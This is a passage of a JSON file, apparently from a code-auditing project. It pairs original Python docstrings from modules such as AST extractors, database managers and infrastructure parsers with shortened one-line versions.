    "original": "\"\"\"Code snippet manager for reading source code lines with LRU caching.\n\nProvides language-agnostic source code extraction for the explain command.\nReads files from disk on-demand with caching to avoid repeated file I/O.\n\nUsage:\n    manager = CodeSnippetManager(Path.cwd())\n    snippet = manager.get_snippet(\"src/auth.py\", 42, expand_block=True)\n\"\"\"",
    "truncated": "\"\"\"Code snippet manager for reading source code lines with LRU caching.\"\"\""
  },
  {
    "file": "theauditor/utils/helpers.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"\n    Compute SHA256 hash of a file.\n\n    Args:\n        file_path: Path to the file\n\n    Returns:\n        Hex digest of SHA256 hash\n    \"\"\"",
    "truncated": "\"\"\"Compute SHA256 hash of a file.\"\"\""
  },
  {
    "file": "theauditor/utils/helpers.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"\n    Count number of lines in a text file.\n\n    Args:\n        file_path: Path to the file\n\n    Returns:\n        Number of lines\n    \"\"\"",
    "truncated": "\"\"\"Count number of lines in a text file.\"\"\""
  },
  {
    "file": "theauditor/utils/rate_limiter.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"\n    Get or create rate limiter for a service.\n\n    Args:\n        service: Service name ('npm', 'py', 'pypi', 'docker', 'github', 'docs')\n\n    Returns:\n        AsyncRateLimiter configured for that service\n    \"\"\"",
    "truncated": "\"\"\"Get or create rate limiter for a service.\"\"\""
  },
  {
    "file": "theauditor/utils/temp_manager.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Create stdout and stderr temp files for subprocess capture.\n\n        Args:\n            root_path: Project root directory\n            tool_name: Name of tool/process (for filename)\n\n        Returns:\n            Tuple of (stdout_path, stderr_path)\n        \"\"\"",
    "truncated": "\"\"\"Create stdout and stderr temp files for subprocess capture.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/cfg_extractor.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Build control flow graph for a single Python function.\n\n    Args:\n        func_node: Function AST node\n\n    Returns:\n        CFG data dictionary\n    \"\"\"",
    "truncated": "\"\"\"Build control flow graph for a single Python function.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/core_extractors.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Extract ALL variable usage for complete data flow analysis.\n\n    This is critical for taint analysis, dead code detection, and\n    understanding the complete data flow in Python code.\n\n    Returns:\n        List of all variable usage records with read/write/delete operations\n    \"\"\"",
    "truncated": "\"\"\"Extract ALL variable usage for complete data flow analysis.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/flask_extractors.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Extract FastAPI dependency injection from function signature.\n\n    Args:\n        node: AST FunctionDef node\n\n    Returns:\n        List of dependency names (e.g., ['Depends(get_current_user)'])\n    \"\"\"",
    "truncated": "\"\"\"Extract FastAPI dependency injection from function signature.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/testing_extractors.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Extract pytest fixture definitions from Python AST.\n\n    Args:\n        context: FileContext containing AST tree and node index\n\n    Returns:\n        List of pytest fixture records\n    \"\"\"",
    "truncated": "\"\"\"Extract pytest fixture definitions from Python AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/testing_extractors.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Extract pytest.mark.parametrize decorators from Python AST.\n\n    Args:\n        context: FileContext containing AST tree and node index\n\n    Returns:\n        List of parametrize records\n    \"\"\"",
    "truncated": "\"\"\"Extract pytest.mark.parametrize decorators from Python AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/testing_extractors.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Extract custom pytest markers from Python AST.\n\n    Args:\n        context: FileContext containing AST tree and node index\n\n    Returns:\n        List of marker records\n    \"\"\"",
    "truncated": "\"\"\"Extract custom pytest markers from Python AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/testing_extractors.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Extract unittest.mock usage from Python AST.\n\n    Args:\n        context: FileContext containing AST tree and node index\n\n    Returns:\n        List of mock pattern records\n    \"\"\"",
    "truncated": "\"\"\"Extract unittest.mock usage from Python AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/utils/context.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"O(1) node lookup by type.\n\n        Args:\n            node_type: Single type or tuple of types\n\n        Returns:\n            List of matching nodes\n        \"\"\"",
    "truncated": "\"\"\"O(1) node lookup by type.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/utils/context.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Find function containing given line.\n\n        Args:\n            line: Line number\n\n        Returns:\n            Function name or None if global scope\n        \"\"\"",
    "truncated": "\"\"\"Find function containing given line.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/utils/context.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Find class containing given line.\n\n        Args:\n            line: Line number\n\n        Returns:\n            Class name or None if not in class\n        \"\"\"",
    "truncated": "\"\"\"Find class containing given line.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/utils/node_index.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Get all nodes of given type(s) with O(1) lookup.\n\n        Args:\n            node_type: Single type or tuple of types to find\n\n        Returns:\n            List of matching nodes\n        \"\"\"",
    "truncated": "\"\"\"Get all nodes of given type(s) with O(1) lookup.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/treesitter_impl.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Tree-sitter generic AST extraction implementations.\n\nThis module contains Tree-sitter extraction logic that works across multiple languages.\n\nCRITICAL: Tree-sitter is FORBIDDEN for JavaScript/TypeScript files.\nIt produces corrupted data (e.g., \"anonymous\" function names).\nJS/TS MUST use TypeScript Compiler API (semantic parser) - NO EXCEPTIONS.\n\"\"\"",
    "truncated": "\"\"\"Tree-sitter generic AST extraction implementations.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/typescript_impl_structure.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Extract function calls from TypeScript semantic AST.\n\n    PHASE 5: EXTRACTION-FIRST ARCHITECTURE\n\n    Now supports two modes:\n    1. PRE-EXTRACTED DATA (batch parsing) - Calls extracted in JavaScript\n    2. AST TRAVERSAL (individual parsing) - Fallback for backward compatibility\n    \"\"\"",
    "truncated": "\"\"\"Extract function calls from TypeScript semantic AST.\"\"\""
  },
  {
    "file": "theauditor/ast_parser.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Check if a language is supported for AST parsing.\n\n        Args:\n            language: Programming language name.\n\n        Returns:\n            True if AST parsing is supported.\n        \"\"\"",
    "truncated": "\"\"\"Check if a language is supported for AST parsing.\"\"\""
  },
  {
    "file": "theauditor/aws_cdk/__init__.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"AWS CDK Infrastructure-as-Code security analysis module.\n\nThis module provides security analysis capabilities for AWS CDK Python code,\ndetecting infrastructure misconfigurations before deployment.\n\nComponents:\n- analyzer.py: AWSCdkAnalyzer class for running CDK security rules\n\"\"\"",
    "truncated": "\"\"\"AWS CDK Infrastructure-as-Code security analysis module.\"\"\""
  },
  {
    "file": "theauditor/aws_cdk/analyzer.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Check if finding comes from a CDK rule.\n\n        CDK rules have rule_name starting with 'aws-cdk-'.\n\n        Args:\n            finding: Dictionary from orchestrator.run_database_rules()\n                     Note: orchestrator converts StandardFinding.rule_name → dict['rule']\n        \"\"\"",
    "truncated": "\"\"\"Check if finding comes from a CDK rule.\"\"\""
  },
  {
    "file": "theauditor/cache/ast_cache.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Evict old cache entries if limits are exceeded.\n\n        This prevents unbounded disk usage that could fill the entire drive.\n\n        Args:\n            max_size_bytes: Maximum cache size in bytes (default: 1GB = 1073741824 bytes)\n            max_files: Maximum number of cached files (default: 20,000)\n        \"\"\"",
    "truncated": "\"\"\"Evict old cache entries if limits are exceeded.\"\"\""
  },
  {
    "file": "theauditor/context/deadcode_graph.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Graph-based dead code analyzer.\n\n    Uses:\n    - graphs.db for import/call graph structure\n    - repo_index.db for entry point detection (decorators, frameworks)\n\n    Zero fallback policy: crashes if databases malformed or missing tables.\n    \"\"\"",
    "truncated": "\"\"\"Graph-based dead code analyzer.\"\"\""
  },
  {
    "file": "theauditor/context/explain_formatter.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Format React/Vue component explain output.\n\n        Args:\n            data: Component data with hooks, children, props\n\n        Returns:\n            Formatted text output\n        \"\"\"",
    "truncated": "\"\"\"Format React/Vue component explain output.\"\"\""
  },
  {
    "file": "theauditor/context/explain_formatter.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Format data as JSON for AI consumption.\n\n        Args:\n            data: Any explain data structure\n\n        Returns:\n            JSON string with 2-space indentation\n        \"\"\"",
    "truncated": "\"\"\"Format data as JSON for AI consumption.\"\"\""
  },
  {
    "file": "theauditor/context/explain_formatter.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Format framework-specific information section.\n\n        Args:\n            framework_info: Dict with framework-specific data\n\n        Returns:\n            Formatted section string\n        \"\"\"",
    "truncated": "\"\"\"Format framework-specific information section.\"\"\""
  },
  {
    "file": "theauditor/context/explain_formatter.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Format explain output for text and JSON modes.\n\n    Output rules:\n    - NO EMOJIS (Windows CP1252 compatibility)\n    - Dynamic limit per section (passed from CLI)\n    - Line truncation at 120 chars\n    - Separator: 80x '='\n    \"\"\"",
    "truncated": "\"\"\"Format explain output for text and JSON modes.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Initialize with project root.\n\n        Args:\n            root: Project root directory (contains .pf/)\n\n        Raises:\n            FileNotFoundError: If repo_index.db doesn't exist\n        \"\"\"",
    "truncated": "\"\"\"Initialize with project root.\"\"\""
  },
  {
    "file": "theauditor/deps.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"\n    Parse a Python dependency specification.\n    Returns (name, version) tuple.\n\n    Package names are normalized to PyPI canonical form (PEP 503):\n    - PyYAML -> pyyaml\n    - My_Package -> my-package\n    \"\"\"",
    "truncated": "\"\"\"Parse a Python dependency specification.\"\"\""
  },
  {
    "file": "theauditor/framework_detector.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Get workspace dependencies from a Cargo workspace root.\n\n        Args:\n            workspace_root: Path to the workspace root Cargo.toml\n\n        Returns:\n            Dict mapping package names to version strings\n        \"\"\"",
    "truncated": "\"\"\"Get workspace dependencies from a Cargo workspace root.\"\"\""
  },
  {
    "file": "theauditor/graph/cfg_builder.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Get list of all functions with CFG data.\n\n        Args:\n            file_path: Optional filter by file path\n\n        Returns:\n            List of function metadata dictionaries\n        \"\"\"",
    "truncated": "\"\"\"Get list of all functions with CFG data.\"\"\""
  },
  {
    "file": "theauditor/graph/path_correlator.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Find findings that co-exist on same execution paths.\n\n        Args:\n            findings: List of finding dictionaries with file, line, tool, etc.\n\n        Returns:\n            List of path clusters with findings guaranteed to be on same path\n        \"\"\"",
    "truncated": "\"\"\"Find findings that co-exist on same execution paths.\"\"\""
  },
  {
    "file": "theauditor/graph/path_correlator.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Build adjacency list representation of CFG for efficient traversal.\n\n        Args:\n            cfg: CFG dictionary with edges\n\n        Returns:\n            Dict mapping block_id -> list of successor block_ids\n        \"\"\"",
    "truncated": "\"\"\"Build adjacency list representation of CFG for efficient traversal.\"\"\""
  },
  {
    "file": "theauditor/graph/strategies/node_express.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Strategy for building Node.js Express middleware and controller edges.\n\n    Handles:\n    - Middleware chain edges (req flows through middleware sequence)\n    - Controller implementation edges (route handler -> controller method)\n\n    Creates edges showing data flow through Express request handling pipeline.\n    \"\"\"",
    "truncated": "\"\"\"Strategy for building Node.js Express middleware and controller edges.\"\"\""
  },
  {
    "file": "theauditor/graph/strategies/node_express.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Node Express Strategy - Handles Express middleware chains and controller resolution.\n\nThis strategy builds edges for:\n1. Express middleware chains (validateBody -> authenticate -> controller)\n2. Controller implementation resolution (route handler -> actual controller method)\n\nExtracted from dfg_builder.py as part of Phase 3: Strategy Pattern refactoring.\n\"\"\"",
    "truncated": "\"\"\"Node Express Strategy - Handles Express middleware chains and controller resolution.\"\"\""
  },
  {
    "file": "theauditor/graphql/builder.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Find resolver function matching a GraphQL field.\n\n        Matching rules (in priority order):\n        1. resolve_<field_name> method (Graphene pattern)\n        2. <field_name> function (direct naming)\n        3. <field_name>Resolver function (Apollo pattern)\n        4. resolve<FieldName> function (camelCase variant)\n        \"\"\"",
    "truncated": "\"\"\"Find resolver function matching a GraphQL field.\"\"\""
  },
  {
    "file": "theauditor/indexer/core.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Check if file is text (not binary).\n\n    Args:\n        file_path: Path to the file to check\n\n    Returns:\n        True if file is text, False if binary\n    \"\"\"",
    "truncated": "\"\"\"Check if file is text (not binary).\"\"\""
  },
  {
    "file": "theauditor/indexer/core.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Load patterns from .gitignore if it exists.\n\n    Args:\n        root_path: Project root path\n\n    Returns:\n        Set of directory patterns to ignore\n    \"\"\"",
    "truncated": "\"\"\"Load patterns from .gitignore if it exists.\"\"\""
  },
  {
    "file": "theauditor/indexer/core.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Initialize the file walker.\n\n        Args:\n            root_path: Root directory to walk\n            config: Runtime configuration\n            follow_symlinks: Whether to follow symbolic links\n            exclude_patterns: Additional patterns to exclude\n        \"\"\"",
    "truncated": "\"\"\"Initialize the file walker.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/__init__.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Create SQLite database schema - backward compatibility wrapper.\n\n    This function exists for backward compatibility with code that expects\n    to create schema without instantiating a DatabaseManager.\n\n    Args:\n        conn: SQLite connection (remains open after schema creation)\n    \"\"\"",
    "truncated": "\"\"\"Create SQLite database schema - backward compatibility wrapper.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/base_database.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Create all database tables and indexes using schema.py definitions.\n\n        ARCHITECTURE: Schema-driven table creation.\n        - Loops over TABLES registry from schema.py\n        - Calls TableSchema.create_table_sql() for CREATE TABLE\n        - Calls TableSchema.create_indexes_sql() for CREATE INDEX\n        - NO hardcoded SQL (909 lines → 20 lines)\n        \"\"\"",
    "truncated": "\"\"\"Create all database tables and indexes using schema.py definitions.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/core_database.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Add a CFG block to the batch and return its temporary ID.\n\n        SPECIAL CASE: CFG blocks use AUTOINCREMENT, so real IDs are unknown until INSERT.\n        This method returns a temporary negative ID that will be mapped to real ID during flush.\n\n        Note: Since we use AUTOINCREMENT, we need to handle IDs carefully.\n        This returns a temporary ID that will be replaced during flush.\n        \"\"\"",
    "truncated": "\"\"\"Add a CFG block to the batch and return its temporary ID.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/core_database.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Add a JSX function return record for preserved JSX extraction.\n\n        ARCHITECTURE: Normalized many-to-many relationship (JSX variant).\n        - Phase 1: Batch JSX function return record (without return_vars column)\n        - Phase 2: Batch JSX junction records for each return variable\n\n        NO FALLBACKS. If return_vars is malformed, hard fail.\n        \"\"\"",
    "truncated": "\"\"\"Add a JSX function return record for preserved JSX extraction.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/frameworks_database.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Add an API endpoint record to the batch.\n\n        ARCHITECTURE: Normalized many-to-many relationship.\n        - Phase 1: Batch endpoint record (without controls column)\n        - Phase 2: Batch junction records for each control/middleware\n\n        NO FALLBACKS. If controls is malformed, hard fail.\n        \"\"\"",
    "truncated": "\"\"\"Add an API endpoint record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/infrastructure_database.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Add a CDK construct property record to the batch.\n\n        Args:\n            construct_id: FK to cdk_constructs.construct_id\n            property_name: Property keyword argument name (e.g., 'public_read_access')\n            property_value_expr: Serialized property value via ast.unparse()\n            line: Line number of property definition\n        \"\"\"",
    "truncated": "\"\"\"Add a CDK construct property record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/infrastructure_database.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Add a GitHub Actions step reference (${{ }} expression).\n\n        Args:\n            step_id: FK to github_steps\n            reference_location: Where reference appears ('run', 'env', 'with', 'if')\n            reference_type: Type of reference ('github', 'secrets', 'env', 'needs', 'steps')\n            reference_path: Full path (e.g., 'github.event.pull_request.head.sha')\n        \"\"\"",
    "truncated": "\"\"\"Add a GitHub Actions step reference (${{ }} expression).\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Add a React component to the batch.\n\n        ARCHITECTURE: Normalized many-to-many relationship.\n        - Phase 1: Batch component record (without hooks_used column)\n        - Phase 2: Batch junction records for each hook used\n\n        NO FALLBACKS. If hooks_used is malformed, hard fail.\n        \"\"\"",
    "truncated": "\"\"\"Add a React component to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Add a React hook usage to the batch.\n\n        ARCHITECTURE: Normalized many-to-many relationship.\n        - Phase 1: Batch hook record (without dependency_vars column)\n        - Phase 2: Batch junction records for each dependency variable\n\n        NO FALLBACKS. If dependency_vars is malformed, hard fail.\n        \"\"\"",
    "truncated": "\"\"\"Add a React hook usage to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Add an Angular component to the batch.\n\n        ARCHITECTURE: Normalized many-to-many relationships.\n        - Phase 1: Batch parent component record (NO style_paths column)\n        - Phase 2: Batch junction records for each style path\n\n        NO FALLBACKS. If data is malformed, hard fail.\n        \"\"\"",
    "truncated": "\"\"\"Add an Angular component to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Add a package.json configuration to the batch.\n\n        Note: Dependencies, scripts, engines, workspaces go to junction tables:\n        - package_dependencies (via add_package_dependency)\n        - package_scripts (via add_package_script)\n        - package_engines (via add_package_engine)\n        - package_workspaces (via add_package_workspace)\n        \"\"\"",
    "truncated": "\"\"\"Add a package.json configuration to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Add framework taint pattern (source/sink) to batch.\n\n        Args:\n            framework_id: FK to frameworks.id\n            pattern: Pattern string (e.g., 'req.body', 'eval')\n            pattern_type: 'source' or 'sink'\n            category: Optional category (e.g., 'http_request', 'code_execution')\n        \"\"\"",
    "truncated": "\"\"\"Add framework taint pattern (source/sink) to batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/docker.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Check if this extractor should handle the file.\n\n        Args:\n            file_path: Path to the file\n\n        Returns:\n            True if this is a Dockerfile\n        \"\"\"",
    "truncated": "\"\"\"Check if this extractor should handle the file.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/docker.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Docker file extractor - Database-First Architecture.\n\nExtracts facts from Dockerfiles directly to database.\nNO security checks (that's what rules do).\nNO separate parser class (inline parsing).\n\nFollows gold standard: Facts only, direct DB writes, no intermediate dicts.\n\"\"\"",
    "truncated": "\"\"\"Docker file extractor - Database-First Architecture.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/generic.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Parse a port mapping string into components.\n\n        Args:\n            port_str: Port mapping like \"8080:80\", \"8080:80/tcp\", \"80\"\n\n        Returns:\n            Dict with host_port, container_port, protocol or None\n        \"\"\"",
    "truncated": "\"\"\"Parse a port mapping string into components.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/generic.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Parse a volume mapping string into components.\n\n        Args:\n            volume_str: Volume mapping like \"./data:/app/data\", \"/app/data\", \"./data:/app/data:ro\"\n\n        Returns:\n            Dict with host_path, container_path, mode or None\n        \"\"\"",
    "truncated": "\"\"\"Parse a volume mapping string into components.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/generic.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Extract Docker image name from service config.\n\n        Args:\n            config: Service configuration dict\n\n        Returns:\n            Image name or None\n        \"\"\"",
    "truncated": "\"\"\"Extract Docker image name from service config.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/graphql.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Parse GraphQL type node into (type_string, is_list, is_nullable).\n\n        Args:\n            type_node: GraphQL type node (can be NonNullType, ListType, or NamedType)\n\n        Returns:\n            Tuple of (type_string, is_list, is_nullable)\n        \"\"\"",
    "truncated": "\"\"\"Parse GraphQL type node into (type_string, is_list, is_nullable).\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/graphql.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Extract directive metadata from AST nodes.\n\n        Args:\n            directives: List of directive nodes\n\n        Returns:\n            List of directive dicts\n        \"\"\"",
    "truncated": "\"\"\"Extract directive metadata from AST nodes.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/javascript_resolvers.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Normalize path by resolving . and .. segments.\n\n    Args:\n        path: Path with potential . and .. segments\n\n    Returns:\n        Normalized path\n    \"\"\"",
    "truncated": "\"\"\"Normalize path by resolving . and .. segments.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/prisma.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Check if this extractor should handle the file.\n\n        Args:\n            file_path: Path to the file\n\n        Returns:\n            True if this is a schema.prisma file\n        \"\"\"",
    "truncated": "\"\"\"Check if this extractor should handle the file.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/prisma.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Parse fields within a model block.\n\n        Args:\n            content: Content inside model { } block\n\n        Returns:\n            List of field dictionaries\n        \"\"\"",
    "truncated": "\"\"\"Parse fields within a model block.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/python_deps.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Check if this extractor should handle the file.\n\n        Args:\n            file_path: Path to the file\n\n        Returns:\n            True if this is a Python dependency file\n        \"\"\"",
    "truncated": "\"\"\"Check if this extractor should handle the file.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/python_deps.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Python dependency extraction for pyproject.toml and requirements.txt.\n\nExtracts Python package dependencies from:\n- pyproject.toml (using tomllib)\n- requirements.txt and requirements-*.txt files\n\nStores in python_package_configs table for fast dependency checking.\n\"\"\"",
    "truncated": "\"\"\"Python dependency extraction for pyproject.toml and requirements.txt.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/terraform.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Detect Terraform backend type from terraform {} blocks.\n\n        Args:\n            parsed: Parsed Terraform data\n\n        Returns:\n            Backend type string ('s3', 'local', 'remote', etc.) or None\n        \"\"\"",
    "truncated": "\"\"\"Detect Terraform backend type from terraform {} blocks.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/terraform.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Convert tree-sitter resource format to TerraformParser format.\n\n        Args:\n            ts_resources: Resources from hcl_impl (with line/column)\n\n        Returns:\n            Resources in TerraformParser format matching database schema\n        \"\"\"",
    "truncated": "\"\"\"Convert tree-sitter resource format to TerraformParser format.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/terraform.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Convert tree-sitter variable format to TerraformParser format.\n\n        Args:\n            ts_variables: Variables from hcl_impl (with line/column and attributes)\n\n        Returns:\n            Variables in TerraformParser format matching database schema\n        \"\"\"",
    "truncated": "\"\"\"Convert tree-sitter variable format to TerraformParser format.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/terraform.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Convert tree-sitter output format to TerraformParser format.\n\n        Args:\n            ts_outputs: Outputs from hcl_impl (with line/column and attributes)\n\n        Returns:\n            Outputs in TerraformParser format matching database schema\n        \"\"\"",
    "truncated": "\"\"\"Convert tree-sitter output format to TerraformParser format.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/terraform.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Convert tree-sitter data source format to TerraformParser format.\n\n        Args:\n            ts_data: Data sources from hcl_impl (with line/column)\n\n        Returns:\n            Data sources in TerraformParser format matching database schema\n        \"\"\"",
    "truncated": "\"\"\"Convert tree-sitter data source format to TerraformParser format.\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/core_storage.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Store CDK construct properties from flat junction array (JS format).\n\n        JS sends: {construct_line, construct_class, property_name, value_expr, property_line}\n        Schema expects: construct_id FK which we reconstruct from file_path + line + class.\n\n        NOTE: construct_name not available in flat format, defaults to 'unnamed'.\n        This matches behavior when Python extracts nested properties.\n        \"\"\"",
    "truncated": "\"\"\"Store CDK construct properties from flat junction array (JS format).\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/node_storage.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Store Angular module PARENT RECORDS ONLY.\n\n        Junction data (declarations, imports, providers, exports) stored via dedicated handlers:\n        - _store_angular_module_declarations()\n        - _store_angular_module_imports()\n        - _store_angular_module_providers()\n        - _store_angular_module_exports()\n        \"\"\"",
    "truncated": "\"\"\"Store Angular module PARENT RECORDS ONLY.\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/python_storage.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Store Python test fixtures (fixture/parametrize/marker/mock/etc).\n\n        Two-discriminator pattern:\n        - fixture_kind: Table discriminator (fixture/parametrize/marker/mock/plugin_hook/hypothesis)\n        - fixture_type: Extractor's subtype (preserved from extractor)\n\n        Junction table: python_fixture_params for params array\n        \"\"\"",
    "truncated": "\"\"\"Store Python test fixtures (fixture/parametrize/marker/mock/etc).\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/python_storage.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Store Python framework configurations (flask/celery/django).\n\n        Two-discriminator pattern:\n        - config_kind: Table discriminator (app/extension/hook/error_handler/task/signal/admin/form/middleware/blueprint/resolver)\n        - config_type: Extractor's subtype (preserved from extractor)\n\n        Junction table: python_framework_methods for methods array\n        \"\"\"",
    "truncated": "\"\"\"Store Python framework configurations (flask/celery/django).\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/python_storage.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Store Python validation schemas (marshmallow/drf/wtforms).\n\n        Two-discriminator pattern:\n        - schema_kind: Table discriminator (schema/field/serializer/form)\n        - schema_type: Extractor's subtype (preserved from extractor)\n\n        Junction table: python_schema_validators for validators array\n        \"\"\"",
    "truncated": "\"\"\"Store Python validation schemas (marshmallow/drf/wtforms).\"\"\""
  },
  {
    "file": "theauditor/insights/ml.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"\n    Validate ML queries against schema contract.\n\n    This function ensures all database queries use valid column names\n    from the schema contract, preventing runtime errors if schema changes.\n\n    Called once at module initialization.\n    \"\"\"",
    "truncated": "\"\"\"Validate ML queries against schema contract.\"\"\""
  },
  {
    "file": "theauditor/insights/ml.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"\n    Load and aggregate stats from all historical journal files.\n\n    Args:\n        history_dir: Base history directory\n        window: Number of recent entries to analyze per file\n        run_type: Type of runs to load (\"full\", \"diff\", or \"all\")\n    \"\"\"",
    "truncated": "\"\"\"Load and aggregate stats from all historical journal files.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/cli.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Slim CLI orchestrator for ML training and inference.\n\nDelegates to specialized modules:\n- loaders.py: Historical data loading\n- features.py: Database feature extraction\n- intelligence.py: Smart parsing (journal + raw artifacts)\n- models.py: Model training/loading/saving\n\"\"\"",
    "truncated": "\"\"\"Slim CLI orchestrator for ML training and inference.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/loaders.py",
    "line": -1,
